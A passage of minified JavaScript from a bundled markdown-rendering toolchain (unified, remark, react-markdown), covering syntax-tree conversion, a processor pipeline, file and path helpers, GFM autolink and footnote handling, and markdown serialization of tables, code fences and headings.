v8(e,t){e.position&&(t.position=Yk(e))}function b8(e,t){let n=t;if(e&&e.data){const r=e.data.hName,a=e.data.hChildren,l=e.data.hProperties;if(typeof r=="string")if(n.type==="element")n.tagName=r;else{const u="children"in n?n.children:[n];n={type:"element",tagName:r,properties:{},children:u}}n.type==="element"&&l&&Object.assign(n.properties,xs(l)),"children"in n&&n.children&&a!==null&&a!==void 0&&(n.children=a)}return n}function E8(e,t){const n=t.data||{},r="value"in t&&!(_0.call(n,"hProperties")||_0.call(n,"hChildren"))?{type:"text",value:t.value}:{type:"element",tagName:"div",properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function w8(e,t){const n=[];let r=-1;for(t&&n.push({type:"text",value:`
`});++r<e.length;)r&&n.push({type:"text",value:`
`}),n.push(e[r]);return t&&e.length>0&&n.push({type:"text",value:`
`}),n}function Fb(e){let t=0,n=e.charCodeAt(t);for(;n===9||n===32;)t++,n=e.charCodeAt(t);return e.slice(t)}function Mb(e,t){const n=y8(e,t),r=n.one(e,void 0),a=o8(n),l=Array.isArray(r)?{type:"root",children:r}:r||{type:"root",children:[]};return a&&l.children.push({type:"text",value:`
`},a),l}function k8(e,t){return e&&"run"in e?async function(n,r){const a=Mb(n,{file:r,...t});await e.run(a,r)}:function(n,r){return Mb(n,{file:r,...e||t})}}function Bb(e){if(e)throw e}var Id=Object.prototype.hasOwnProperty,yT=Object.prototype.toString,Hb=Object.defineProperty,Ub=Object.getOwnPropertyDescriptor,zb=function(t){return typeof Array.isArray=="function"?Array.isArray(t):yT.call(t)==="[object Array]"},Wb=function(t){if(!t||yT.call(t)!=="[object Object]")return!1;var n=Id.call(t,"constructor"),r=t.constructor&&t.constructor.prototype&&Id.call(t.constructor.prototype,"isPrototypeOf");if(t.constructor&&!n&&!r)return!1;var a;for(a in t);return typeof a>"u"||Id.call(t,a)},qb=function(t,n){Hb&&n.name==="__proto__"?Hb(t,n.name,{enumerable:!0,configurable:!0,value:n.newValue,writable:!0}):t[n.name]=n.newValue},$b=function(t,n){if(n==="__proto__")if(Id.call(t,n)){if(Ub)return Ub(t,n).value}else return;return t[n]},T8=function e(){var t,n,r,a,l,u,f=arguments[0],h=1,m=arguments.length,x=!1;for(typeof f=="boolean"&&(x=f,f=arguments[1]||{},h=2),(f==null||typeof f!="object"&&typeof f!="function")&&(f={});h<m;++h)if(t=arguments[h],t!=null)for(n in t)r=$b(f,n),a=$b(t,n),f!==a&&(x&&a&&(Wb(a)||(l=zb(a)))?(l?(l=!1,u=r&&zb(r)?r:[]):u=r&&Wb(r)?r:{},qb(f,{name:n,newValue:e(x,u,a)})):typeof a<"u"&&qb(f,{name:n,newValue:a}));return f};const sm=bf(T8);function I0(e){if(typeof e!="object"||e===null)return!1;const t=Object.getPrototypeOf(e);return(t===null||t===Object.prototype||Object.getPrototypeOf(t)===null)&&!(Symbol.toStringTag in e)&&!(Symbol.iterator in e)}function C8(){const e=[],t={run:n,use:r};return t;function n(...a){let l=-1;const u=a.pop();if(typeof u!="function")throw new TypeError("Expected function as last argument, not "+u);f(null,...a);function f(h,...m){const x=e[++l];let g=-1;if(h){u(h);return}for(;++g<a.length;)(m[g]===null||m[g]===void 0)&&(m[g]=a[g]);a=m,x?S8(x,f)(...m):u(null,...m)}}function r(a){if(typeof a!="function")throw new TypeError("Expected `middelware` to be a function, not "+a);return e.push(a),t}}function S8(e,t){let n;return r;function r(...u){const f=e.length>u.length;let h;f&&u.push(a);try{h=e.apply(this,u)}catch(m){const x=m;if(f&&n)throw x;return a(x)}f||(h&&h.then&&typeof h.then=="function"?h.then(l,a):h instanceof Error?a(h):l(h))}function a(u,...f){n||(n=!0,t(u,...f))}function l(u){a(null,u)}}const li={basename:N8,dirname:A8,extname:D8,join:L8,sep:"/"};function N8(e,t){if(t!==void 0&&typeof t!="string")throw new TypeError('"ext" argument must be a string');rc(e);let n=0,r=-1,a=e.length,l;if(t===void 0||t.length===0||t.length>e.length){for(;a--;)if(e.codePointAt(a)===47){if(l){n=a+1;break}}else r<0&&(l=!0,r=a+1);return r<0?"":e.slice(n,r)}if(t===e)return"";let u=-1,f=t.length-1;for(;a--;)if(e.codePointAt(a)===47){if(l){n=a+1;break}}else u<0&&(l=!0,u=a+1),f>-1&&(e.codePointAt(a)===t.codePointAt(f--)?f<0&&(r=a):(f=-1,r=u));return n===r?r=u:r<0&&(r=e.length),e.slice(n,r)}function A8(e){if(rc(e),e.length===0)return".";let t=-1,n=e.length,r;for(;--n;)if(e.codePointAt(n)===47){if(r){t=n;break}}else r||(r=!0);return t<0?e.codePointAt(0)===47?"/":".":t===1&&e.codePointAt(0)===47?"//":e.slice(0,t)}function D8(e){rc(e);let t=e.length,n=-1,r=0,a=-1,l=0,u;for(;t--;){const f=e.codePointAt(t);if(f===47){if(u){r=t+1;break}continue}n<0&&(u=!0,n=t+1),f===46?a<0?a=t:l!==1&&(l=1):a>-1&&(l=-1)}return a<0||n<0||l===0||l===1&&a===n-1&&a===r+1?"":e.slice(a,n)}function L8(...e){let t=-1,n;for(;++t<e.length;)rc(e[t]),e[t]&&(n=n===void 0?e[t]:n+"/"+e[t]);return n===void 0?".":_8(n)}function _8(e){rc(e);const t=e.codePointAt(0)===47;let n=I8(e,!t);return n.length===0&&!t&&(n="."),n.length>0&&e.codePointAt(e.length-1)===47&&(n+="/"),t?"/"+n:n}function I8(e,t){let n="",r=0,a=-1,l=0,u=-1,f,h;for(;++u<=e.length;){if(u<e.length)f=e.codePointAt(u);else{if(f===47)break;f=47}if(f===47){if(!(a===u-1||l===1))if(a!==u-1&&l===2){if(n.length<2||r!==2||n.codePointAt(n.length-1)!==46||n.codePointAt(n.length-2)!==46){if(n.length>2){if(h=n.lastIndexOf("/"),h!==n.length-1){h<0?(n="",r=0):(n=n.slice(0,h),r=n.length-1-n.lastIndexOf("/")),a=u,l=0;continue}}else if(n.length>0){n="",r=0,a=u,l=0;continue}}t&&(n=n.length>0?n+"/..":"..",r=2)}else n.length>0?n+="/"+e.slice(a+1,u):n=e.slice(a+1,u),r=u-a-1;a=u,l=0}else f===46&&l>-1?l++:l=-1}return n}function rc(e){if(typeof e!="string")throw new TypeError("Path must be a string. Received "+JSON.stringify(e))}const P8={cwd:j8};function j8(){return"/"}function P0(e){return!!(e!==null&&typeof e=="object"&&"href"in e&&e.href&&"protocol"in e&&e.protocol&&e.auth===void 0)}function R8(e){if(typeof e=="string")e=new URL(e);else if(!P0(e)){const t=new TypeError('The "path" argument must be of type string or an instance of URL. Received `'+e+"`");throw t.code="ERR_INVALID_ARG_TYPE",t}if(e.protocol!=="file:"){const t=new TypeError("The URL must be of scheme file");throw t.code="ERR_INVALID_URL_SCHEME",t}return O8(e)}function O8(e){if(e.hostname!==""){const r=new TypeError('File URL host must be "localhost" or empty on darwin');throw r.code="ERR_INVALID_FILE_URL_HOST",r}const t=e.pathname;let n=-1;for(;++n<t.length;)if(t.codePointAt(n)===37&&t.codePointAt(n+1)===50){const r=t.codePointAt(n+2);if(r===70||r===102){const a=new TypeError("File URL path must not include encoded / characters");throw a.code="ERR_INVALID_FILE_URL_PATH",a}}return decodeURIComponent(t)}const lm=["history","path","basename","stem","extname","dirname"];class vT{constructor(t){let n;t?P0(t)?n={path:t}:typeof t=="string"||F8(t)?n={value:t}:n=t:n={},this.cwd="cwd"in n?"":P8.cwd(),this.data={},this.history=[],this.messages=[],this.value,this.map,this.result,this.stored;let r=-1;for(;++r<lm.length;){const l=lm[r];l in n&&n[l]!==void 0&&n[l]!==null&&(this[l]=l==="history"?[...n[l]]:n[l])}let a;for(a in n)lm.includes(a)||(this[a]=n[a])}get basename(){return typeof this.path=="string"?li.basename(this.path):void 0}set basename(t){um(t,"basename"),om(t,"basename"),this.path=li.join(this.dirname||"",t)}get dirname(){return typeof this.path=="string"?li.dirname(this.path):void 0}set dirname(t){Yb(this.basename,"dirname"),this.path=li.join(t||"",this.basename)}get extname(){return typeof this.path=="string"?li.extname(this.path):void 0}set extname(t){if(om(t,"extname"),Yb(this.dirname,"extname"),t){if(t.codePointAt(0)!==46)throw new Error("`extname` must start with `.`");if(t.includes(".",1))throw new Error("`extname` cannot contain multiple dots")}this.path=li.join(this.dirname,this.stem+(t||""))}get path(){return this.history[this.history.length-1]}set path(t){P0(t)&&(t=R8(t)),um(t,"path"),this.path!==t&&this.history.push(t)}get stem(){return typeof this.path=="string"?li.basename(this.path,this.extname):void 0}set stem(t){um(t,"stem"),om(t,"stem"),this.path=li.join(this.dirname||"",t+(this.extname||""))}fail(t,n,r){const a=this.message(t,n,r);throw a.fatal=!0,a}info(t,n,r){const a=this.message(t,n,r);return a.fatal=void 0,a}message(t,n,r){const a=new Mn(t,n,r);return this.path&&(a.name=this.path+":"+a.name,a.file=this.path),a.fatal=!1,this.messages.push(a),a}toString(t){return this.value===void 0?"":typeof this.value=="string"?this.value:new TextDecoder(t||void 0).decode(this.value)}}function om(e,t){if(e&&e.includes(li.sep))throw new Error("`"+t+"` cannot be a path: did not expect `"+li.sep+"`")}function um(e,t){if(!e)throw new Error("`"+t+"` cannot be empty")}function Yb(e,t){if(!e)throw new Error("Setting `"+t+"` requires `path` to be set too")}function F8(e){return!!(e&&typeof e=="object"&&"byteLength"in e&&"byteOffset"in e)}const M8=function(e){const r=this.constructor.prototype,a=r[e],l=function(){return a.apply(l,arguments)};return Object.setPrototypeOf(l,r),l},B8={}.hasOwnProperty;class yx extends M8{constructor(){super("copy"),this.Compiler=void 0,this.Parser=void 0,this.attachers=[],this.compiler=void 0,this.freezeIndex=-1,this.frozen=void 0,this.namespace={},this.parser=void 0,this.transformers=C8()}copy(){const t=new yx;let n=-1;for(;++n<this.attachers.length;){const r=this.attachers[n];t.use(...r)}return t.data(sm(!0,{},this.namespace)),t}data(t,n){return typeof t=="string"?arguments.length===2?(fm("data",this.frozen),this.namespace[t]=n,this):B8.call(this.namespace,t)&&this.namespace[t]||void 0:t?(fm("data",this.frozen),this.namespace=t,this):this.namespace}freeze(){if(this.frozen)return this;const t=this;for(;++this.freezeIndex<this.attachers.length;){const[n,...r]=this.attachers[this.freezeIndex];if(r[0]===!1)continue;r[0]===!0&&(r[0]=void 0);const a=n.call(t,...r);typeof a=="function"&&this.transformers.use(a)}return this.frozen=!0,this.freezeIndex=Number.POSITIVE_INFINITY,this}parse(t){this.freeze();const n=cd(t),r=this.parser||this.Parser;return cm("parse",r),r(String(n),n)}process(t,n){const r=this;return this.freeze(),cm("process",this.parser||this.Parser),dm("process",this.compiler||this.Compiler),n?a(void 0,n):new Promise(a);function a(l,u){const f=cd(t),h=r.parse(f);r.run(h,f,function(x,g,b){if(x||!g||!b)return m(x);const E=g,C=r.stringify(E,b);z8(C)?b.value=C:b.result=C,m(x,b)});function m(x,g){x||!g?u(x):l?l(g):n(void 0,g)}}}processSync(t){let n=!1,r;return this.freeze(),cm("processSync",this.parser||this.Parser),dm("processSync",this.compiler||this.Compiler),this.process(t,a),Gb("processSync","process",n),r;function a(l,u){n=!0,Bb(l),r=u}}run(t,n,r){Vb(t),this.freeze();const a=this.transformers;return!r&&typeof n=="function"&&(r=n,n=void 0),r?l(void 0,r):new Promise(l);function l(u,f){const h=cd(n);a.run(t,h,m);function m(x,g,b){const E=g||t;x?f(x):u?u(E):r(void 0,E,b)}}}runSync(t,n){let r=!1,a;return this.run(t,n,l),Gb("runSync","run",r),a;function l(u,f){Bb(u),a=f,r=!0}}stringify(t,n){this.freeze();const r=cd(n),a=this.compiler||this.Compiler;return dm("stringify",a),Vb(t),a(t,r)}use(t,...n){const r=this.attachers,a=this.namespace;if(fm("use",this.frozen),t!=null)if(typeof t=="function")h(t,n);else if(typeof t=="object")Array.isArray(t)?f(t):u(t);else throw new TypeError("Expected usable value, not `"+t+"`");return this;function l(m){if(typeof m=="function")h(m,[]);else if(typeof m=="object")if(Array.isArray(m)){const[x,...g]=m;h(x,g)}else u(m);else throw new TypeError("Expected usable value, not `"+m+"`")}function u(m){if(!("plugins"in m)&&!("settings"in m))throw new Error("Expected usable value but received an empty preset, which is probably a mistake: presets typically come with `plugins` and sometimes with `settings`, but this has neither");f(m.plugins),m.settings&&(a.settings=sm(!0,a.settings,m.settings))}function f(m){let x=-1;if(m!=null)if(Array.isArray(m))for(;++x<m.length;){const g=m[x];l(g)}else throw new TypeError("Expected a list of plugins, not `"+m+"`")}function h(m,x){let g=-1,b=-1;for(;++g<r.length;)if(r[g][0]===m){b=g;break}if(b===-1)r.push([m,...x]);else if(x.length>0){let[E,...C]=x;const P=r[b][1];I0(P)&&I0(E)&&(E=sm(!0,P,E)),r[b]=[m,E,...C]}}}}const H8=new yx().freeze();function cm(e,t){if(typeof t!="function")throw new TypeError("Cannot `"+e+"` without `parser`")}function dm(e,t){if(typeof t!="function")throw new TypeError("Cannot `"+e+"` without `compiler`")}function fm(e,t){if(t)throw new Error("Cannot call `"+e+"` on a frozen processor.\nCreate a new processor first, by calling it: use `processor()` instead of `processor`.")}function Vb(e){if(!I0(e)||typeof e.type!="string")throw new TypeError("Expected node, got `"+e+"`")}function Gb(e,t,n){if(!n)throw new Error("`"+e+"` finished async. Use `"+t+"` instead")}function cd(e){return U8(e)?e:new vT(e)}function U8(e){return!!(e&&typeof e=="object"&&"message"in e&&"messages"in e)}function z8(e){return typeof e=="string"||W8(e)}function W8(e){return!!(e&&typeof e=="object"&&"byteLength"in e&&"byteOffset"in e)}const q8="https://github.com/remarkjs/react-markdown/blob/main/changelog.md",Qb=[],Kb={allowDangerousHtml:!0},$8=/^(https?|ircs?|mailto|xmpp)$/i,Y8=[{from:"astPlugins",id:"remove-buggy-html-in-markdown-parser"},{from:"allowDangerousHtml",id:"remove-buggy-html-in-markdown-parser"},{from:"allowNode",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"allowElement"},{from:"allowedTypes",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"allowedElements"},{from:"className",id:"remove-classname"},{from:"disallowedTypes",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"disallowedElements"},{from:"escapeHtml",id:"remove-buggy-html-in-markdown-parser"},{from:"includeElementIndex",id:"#remove-includeelementindex"},{from:"includeNodeIndex",id:"change-includenodeindex-to-includeelementindex"},{from:"linkTarget",id:"remove-linktarget"},{from:"plugins",id:"change-plugins-to-remarkplugins",to:"remarkPlugins"},{from:"rawSourcePos",id:"#remove-rawsourcepos"},{from:"renderers",id:"change-renderers-to-components",to:"components"},{from:"source",id:"change-source-to-children",to:"children"},{from:"sourcePos",id:"#remove-sourcepos"},{from:"transformImageUri",id:"#add-urltransform",to:"urlTransform"},{from:"transformLinkUri",id:"#add-urltransform",to:"urlTransform"}];function bT(e){const t=V8(e),n=G8(e);return Q8(t.runSync(t.parse(n),n),e)}function V8(e){const t=e.rehypePlugins||Qb,n=e.remarkPlugins||Qb,r=e.remarkRehypeOptions?{...e.remarkRehypeOptions,...Kb}:Kb;return H8().use(Dj).use(n).use(k8,r).use(t)}function G8(e){const t=e.children||"",n=new vT;return typeof t=="string"&&(n.value=t),n}function Q8(e,t){const n=t.allowedElements,r=t.allowElement,a=t.components,l=t.disallowedElements,u=t.skipHtml,f=t.unwrapDisallowed,h=t.urlTransform||K8;for(const x of Y8)Object.hasOwn(t,x.from)&&(""+x.from+(x.to?"use `"+x.to+"` instead":"remove it")+q8+x.id,void 0);return mh(e,m),f5(e,{Fragment:o.Fragment,components:a,ignoreInvalidStyle:!0,jsx:o.jsx,jsxs:o.jsxs,passKeys:!0,passNode:!0});function m(x,g,b){if(x.type==="raw"&&b&&typeof g=="number")return u?b.children.splice(g,1):b.children[g]={type:"text",value:x.value},g;if(x.type==="element"){let E;for(E in rm)if(Object.hasOwn(rm,E)&&Object.hasOwn(x.properties,E)){const C=x.properties[E],P=rm[E];(P===null||P.includes(x.tagName))&&(x.properties[E]=h(String(C||""),E,x))}}if(x.type==="element"){let E=n?!n.includes(x.tagName):l?l.includes(x.tagName):!1;if(!E&&r&&typeof g=="number"&&(E=!r(x,g,b)),E&&b&&typeof g=="number")return f&&x.children?b.children.splice(g,1,...x.children):b.children.splice(g,1),g}}}function K8(e){const t=e.indexOf(":"),n=e.indexOf("?"),r=e.indexOf("#"),a=e.indexOf("/");return t===-1||a!==-1&&t>a||n!==-1&&t>n||r!==-1&&t>r||$8.test(e.slice(0,t))?e:""}function Xb(e,t){const n=String(e);if(typeof t!="string")throw new TypeError("Expected character");let r=0,a=n.indexOf(t);for(;a!==-1;)r++,a=n.indexOf(t,a+t.length);return r}function X8(e){if(typeof e!="string")throw new TypeError("Expected a string");return e.replace(/[|\\{}()[\]^$+*?.]/g,"\\$&").replace(/-/g,"\\x2d")}function Z8(e,t,n){const a=hh((n||{}).ignore||[]),l=J8(t);let u=-1;for(;++u<l.length;)xT(e,"text",f);function f(m,x){let g=-1,b;for(;++g<x.length;){const E=x[g],C=b?b.children:void 0;if(a(E,C?C.indexOf(E):void 0,b))return;b=E}if(b)return h(m,x)}function h(m,x){const g=x[x.length-1],b=l[u][0],E=l[u][1];let C=0;const O=g.children.indexOf(m);let N=!1,T=[];b.lastIndex=0;let A=b.exec(m.value);for(;A;){const _=A.index,M={index:A.index,input:A.input,stack:[...x,m]};let R=E(...A,M);if(typeof R=="string"&&(R=R.length>0?{type:"text",value:R}:void 0),R===!1?b.lastIndex=_+1:(C!==_&&T.push({type:"text",value:m.value.slice(C,_)}),Array.isArray(R)?T.push(...R):R&&T.push(R),C=_+A[0].length,N=!0),!b.global)break;A=b.exec(m.value)}return N?(C<m.value.length&&T.push({type:"text",value:m.value.slice(C)}),g.children.splice(O,1,...T)):T=[m],O+T.length}}function J8(e){const t=[];if(!Array.isArray(e))throw new TypeError("Expected find and replace tuple or list of tuples");const n=!e[0]||Array.isArray(e[0])?e:[e];let r=-1;for(;++r<n.length;){const a=n[r];t.push([eR(a[0]),tR(a[1])])}return t}function eR(e){return typeof e=="string"?new RegExp(X8(e),"g"):e}function tR(e){return typeof e=="function"?e:function(){return e}}const hm="phrasing",pm=["autolink","link","image","label"];function nR(){return{transforms:[uR],enter:{literalAutolink:iR,literalAutolinkEmail:mm,literalAutolinkHttp:mm,literalAutolinkWww:mm},exit:{literalAutolink:oR,literalAutolinkEmail:lR,literalAutolinkHttp:aR,literalAutolinkWww:sR}}}function rR(){return{unsafe:[{character:"@",before:"[+\\-.\\w]",after:"[\\-.\\w]",inConstruct:hm,notInConstruct:pm},{character:".",before:"[Ww]",after:"[\\-.\\w]",inConstruct:hm,notInConstruct:pm},{character:":",before:"[ps]",after:"\\/",inConstruct:hm,notInConstruct:pm}]}}function iR(e){this.enter({type:"link",title:null,url:"",children:[]},e)}function mm(e){this.config.enter.autolinkProtocol.call(this,e)}function aR(e){this.config.exit.autolinkProtocol.call(this,e)}function sR(e){this.config.exit.data.call(this,e);const t=this.stack[this.stack.length-1];t.type,t.url="http://"+this.sliceSerialize(e)}function lR(e){this.config.exit.autolinkEmail.call(this,e)}function oR(e){this.exit(e)}function uR(e){Z8(e,[[/(https?:\/\/|www(?=\.))([-.\w]+)([^ \t\r\n]*)/gi,cR],[new RegExp("(?<=^|\\s|\\p{P}|\\p{S})([-.\\w+]+)@([-\\w]+(?:\\.[-\\w]+)+)","gu"),dR]],{ignore:["link","linkReference"]})}function cR(e,t,n,r,a){let l="";if(!ET(a)||(/^w/i.test(t)&&(n=t+n,t="",l="http://"),!fR(n)))return!1;const u=hR(n+r);if(!u[0])return!1;const f={type:"link",title:null,url:l+t+u[0],children:[{type:"text",value:t+u[0]}]};return u[1]?[f,{type:"text",value:u[1]}]:f}function dR(e,t,n,r){return!ET(r,!0)||/[-\d_]$/.test(n)?!1:{type:"link",title:null,url:"mailto:"+t+"@"+n,children:[{type:"text",value:t+"@"+n}]}}function fR(e){const t=e.split(".");return!(t.length<2||t[t.length-1]&&(/_/.test(t[t.length-1])||!/[a-zA-Z\d]/.test(t[t.length-1]))||t[t.length-2]&&(/_/.test(t[t.length-2])||!/[a-zA-Z\d]/.test(t[t.length-2])))}function hR(e){const t=/[!"&'),.:;<>?\]}]+$/.exec(e);if(!t)return[e,void 0];e=e.slice(0,t.index);let n=t[0],r=n.indexOf(")");const a=Xb(e,"(");let l=Xb(e,")");for(;r!==-1&&a>l;)e+=n.slice(0,r+1),n=n.slice(r+1),r=n.indexOf(")"),l++;return[e,n]}function ET(e,t){const n=e.input.charCodeAt(e.index-1);return(e.index===0||gs(n)||ch(n))&&(!t||n!==47)}wT.peek=wR;function pR(){this.buffer()}function mR(e){this.enter({type:"footnoteReference",identifier:"",label:""},e)}function gR(){this.buffer()}function xR(e){this.enter({type:"footnoteDefinition",identifier:"",label:"",children:[]},e)}function yR(e){const t=this.resume(),n=this.stack[this.stack.length-1];n.type,n.identifier=Qr(this.sliceSerialize(e)).toLowerCase(),n.label=t}function vR(e){this.exit(e)}function bR(e){const t=this.resume(),n=this.stack[this.stack.length-1];n.type,n.identifier=Qr(this.sliceSerialize(e)).toLowerCase(),n.label=t}function ER(e){this.exit(e)}function wR(){return"["}function wT(e,t,n,r){const a=n.createTracker(r);let l=a.move("[^");const u=n.enter("footnoteReference"),f=n.enter("reference");return l+=a.move(n.safe(n.associationId(e),{after:"]",before:l})),f(),u(),l+=a.move("]"),l}function kR(){return{enter:{gfmFootnoteCallString:pR,gfmFootnoteCall:mR,gfmFootnoteDefinitionLabelString:gR,gfmFootnoteDefinition:xR},exit:{gfmFootnoteCallString:yR,gfmFootnoteCall:vR,gfmFootnoteDefinitionLabelString:bR,gfmFootnoteDefinition:ER}}}function TR(e){let t=!1;return e&&e.firstLineBlank&&(t=!0),{handlers:{footnoteDefinition:n,footnoteReference:wT},unsafe:[{character:"[",inConstruct:["label","phrasing","reference"]}]};function n(r,a,l,u){const f=l.createTracker(u);let h=f.move("[^");const m=l.enter("footnoteDefinition"),x=l.enter("label");return h+=f.move(l.safe(l.associationId(r),{before:h,after:"]"})),x(),h+=f.move("]:"),r.children&&r.children.length>0&&(f.shift(4),h+=f.move((t?`
`:" ")+l.indentLines(l.containerFlow(r,f.current()),t?kT:CR))),m(),h}}function CR(e,t,n){return t===0?e:kT(e,t,n)}function kT(e,t,n){return(n?"":"    ")+e}const SR=["autolink","destinationLiteral","destinationRaw","reference","titleQuote","titleApostrophe"];TT.peek=_R;function NR(){return{canContainEols:["delete"],enter:{strikethrough:DR},exit:{strikethrough:LR}}}function AR(){return{unsafe:[{character:"~",inConstruct:"phrasing",notInConstruct:SR}],handlers:{delete:TT}}}function DR(e){this.enter({type:"delete",children:[]},e)}function LR(e){this.exit(e)}function TT(e,t,n,r){const a=n.createTracker(r),l=n.enter("strikethrough");let u=a.move("~~");return u+=n.containerPhrasing(e,{...a.current(),before:u,after:"~"}),u+=a.move("~~"),l(),u}function _R(){return"~"}function IR(e){return e.length}function PR(e,t){const n=t||{},r=(n.align||[]).concat(),a=n.stringLength||IR,l=[],u=[],f=[],h=[];let m=0,x=-1;for(;++x<e.length;){const P=[],O=[];let N=-1;for(e[x].length>m&&(m=e[x].length);++N<e[x].length;){const T=jR(e[x][N]);if(n.alignDelimiters!==!1){const A=a(T);O[N]=A,(h[N]===void 0||A>h[N])&&(h[N]=A)}P.push(T)}u[x]=P,f[x]=O}let g=-1;if(typeof r=="object"&&"length"in r)for(;++g<m;)l[g]=Zb(r[g]);else{const P=Zb(r);for(;++g<m;)l[g]=P}g=-1;const b=[],E=[];for(;++g<m;){const P=l[g];let O="",N="";P===99?(O=":",N=":"):P===108?O=":":P===114&&(N=":");let T=n.alignDelimiters===!1?1:Math.max(1,h[g]-O.length-N.length);const A=O+"-".repeat(T)+N;n.alignDelimiters!==!1&&(T=O.length+T+N.length,T>h[g]&&(h[g]=T),E[g]=T),b[g]=A}u.splice(1,0,b),f.splice(1,0,E),x=-1;const C=[];for(;++x<u.length;){const P=u[x],O=f[x];g=-1;const N=[];for(;++g<m;){const T=P[g]||"";let A="",_="";if(n.alignDelimiters!==!1){const M=h[g]-(O[g]||0),R=l[g];R===114?A=" ".repeat(M):R===99?M%2?(A=" ".repeat(M/2+.5),_=" ".repeat(M/2-.5)):(A=" ".repeat(M/2),_=A):_=" ".repeat(M)}n.delimiterStart!==!1&&!g&&N.push("|"),n.padding!==!1&&!(n.alignDelimiters===!1&&T==="")&&(n.delimiterStart!==!1||g)&&N.push(" "),n.alignDelimiters!==!1&&N.push(A),N.push(T),n.alignDelimiters!==!1&&N.push(_),n.padding!==!1&&N.push(" "),(n.delimiterEnd!==!1||g!==m-1)&&N.push("|")}C.push(n.delimiterEnd===!1?N.join("").replace(/ +$/,""):N.join(""))}return C.join(`
`)}function jR(e){return e==null?"":String(e)}function Zb(e){const t=typeof e=="string"?e.codePointAt(0):0;return t===67||t===99?99:t===76||t===108?108:t===82||t===114?114:0}const Jb={}.hasOwnProperty;function CT(e,t){const n=t||{};function r(a,...l){let u=r.invalid;const f=r.handlers;if(a&&Jb.call(a,e)){const h=String(a[e]);u=Jb.call(f,h)?f[h]:r.unknown}if(u)return u.call(this,a,...l)}return r.handlers=n.handlers||{},r.invalid=n.invalid,r.unknown=n.unknown,r}function RR(e,t,n,r){const a=n.enter("blockquote"),l=n.createTracker(r);l.move("> "),l.shift(2);const u=n.indentLines(n.containerFlow(e,l.current()),OR);return a(),u}function OR(e,t,n){return">"+(n?"":" ")+e}function FR(e,t){return e2(e,t.inConstruct,!0)&&!e2(e,t.notInConstruct,!1)}function e2(e,t,n){if(typeof t=="string"&&(t=[t]),!t||t.length===0)return n;let r=-1;for(;++r<t.length;)if(e.includes(t[r]))return!0;return!1}function t2(e,t,n,r){let a=-1;for(;++a<n.unsafe.length;)if(n.unsafe[a].character===`
`&&FR(n.stack,n.unsafe[a]))return/[ \t]/.test(r.before)?"":" ";return`\\
`}function MR(e,t){const n=String(e);let r=n.indexOf(t),a=r,l=0,u=0;if(typeof t!="string")throw new TypeError("Expected substring");for(;r!==-1;)r===a?++l>u&&(u=l):l=1,a=r+t.length,r=n.indexOf(t,a);return u}function BR(e,t){return!!(t.options.fences===!1&&e.value&&!e.lang&&/[^ \r\n]/.test(e.value)&&!/^[\t ]*(?:[\r\n]|$)|(?:^|[\r\n])[\t ]*$/.test(e.value))}function HR(e){const t=e.options.fence||"`";if(t!=="`"&&t!=="~")throw new Error("Cannot serialize code with `"+t+"` for `options.fence`, expected `` ` `` or `~`");return t}function UR(e,t,n,r){const a=HR(n),l=e.value||"",u=a==="`"?"GraveAccent":"Tilde";if(BR(e,n)){const g=n.enter("codeIndented"),b=n.indentLines(l,zR);return g(),b}const f=n.createTracker(r),h=a.repeat(Math.max(MR(l,a)+1,3)),m=n.enter("codeFenced");let x=f.move(h);if(e.lang){const g=n.enter(`codeFencedLang${u}`);x+=f.move(n.safe(e.lang,{before:x,after:" ",encode:["`"],...f.current()})),g()}if(e.lang&&e.meta){const g=n.enter(`codeFencedMeta${u}`);x+=f.move(" "),x+=f.move(n.safe(e.meta,{before:x,after:`
`,encode:["`"],...f.current()})),g()}return x+=f.move(`
`),l&&(x+=f.move(l+`
`)),x+=f.move(h),m(),x}function zR(e,t,n){return(n?"":"    ")+e}function vx(e){const t=e.options.quote||'"';if(t!=='"'&&t!=="'")throw new Error("Cannot serialize title with `"+t+"` for `options.quote`, expected `\"`, or `'`");return t}function WR(e,t,n,r){const a=vx(n),l=a==='"'?"Quote":"Apostrophe",u=n.enter("definition");let f=n.enter("label");const h=n.createTracker(r);let m=h.move("[");return m+=h.move(n.safe(n.associationId(e),{before:m,after:"]",...h.current()})),m+=h.move("]: "),f(),!e.url||/[\0- \u007F]/.test(e.url)?(f=n.enter("destinationLiteral"),m+=h.move("<"),m+=h.move(n.safe(e.url,{before:m,after:">",...h.current()})),m+=h.move(">")):(f=n.enter("destinationRaw"),m+=h.move(n.safe(e.url,{before:m,after:e.title?" ":`
`,...h.current()}))),f(),e.title&&(f=n.enter(`title${l}`),m+=h.move(" "+a),m+=h.move(n.safe(e.title,{before:m,after:a,...h.current()})),m+=h.move(a),f()),u(),m}function qR(e){const t=e.options.emphasis||"*";if(t!=="*"&&t!=="_")throw new Error("Cannot serialize emphasis with `"+t+"` for `options.emphasis`, expected `*`, or `_`");return t}function Bu(e){return"&#x"+e.toString(16).toUpperCase()+";"}function gf(e,t,n){const r=Ll(e),a=Ll(t);return r===void 0?a===void 0?n==="_"?{inside:!0,outside:!0}:{inside:!1,outside:!1}:a===1?{inside:!0,outside:!0}:{inside:!1,outside:!0}:r===1?a===void 0?{inside:!1,outside:!1}:a===1?{inside:!0,outside:!0}:{inside:!1,outside:!1}:a===void 0?{inside:!1,outside:!1}:a===1?{inside:!0,outside:!1}:{inside:!1,outside:!1}}ST.peek=$R;function ST(e,t,n,r){const a=qR(n),l=n.enter("emphasis"),u=n.createTracker(r),f=u.move(a);let h=u.move(n.containerPhrasing(e,{after:a,before:f,...u.current()}));const m=h.charCodeAt(0),x=gf(r.before.charCodeAt(r.before.length-1),m,a);x.inside&&(h=Bu(m)+h.slice(1));const g=h.charCodeAt(h.length-1),b=gf(r.after.charCodeAt(0),g,a);b.inside&&(h=h.slice(0,-1)+Bu(g));const E=u.move(a);return l(),n.attentionEncodeSurroundingInfo={after:b.outside,before:x.outside},f+h+E}function $R(e,t,n){return n.options.emphasis||"*"}function YR(e,t){let n=!1;return mh(e,function(r){if("value"in r&&/\r?\n|\r/.test(r.value)||r.type==="break")return n=!0,L0}),!!((!e.depth||e.depth<3)&&dx(e)&&(t.options.setext||n))}function VR(e,t,n,r){const a=Math.max(Math.min(6,e.depth||1),1),l=n.createTracker(r);if(YR(e,n)){const x=n.enter("headingSetext"),g=n.enter("phrasing"),b=n.containerPhrasing(e,{...l.current(),before:`
`,after:`
`});return g(),x(),b+`
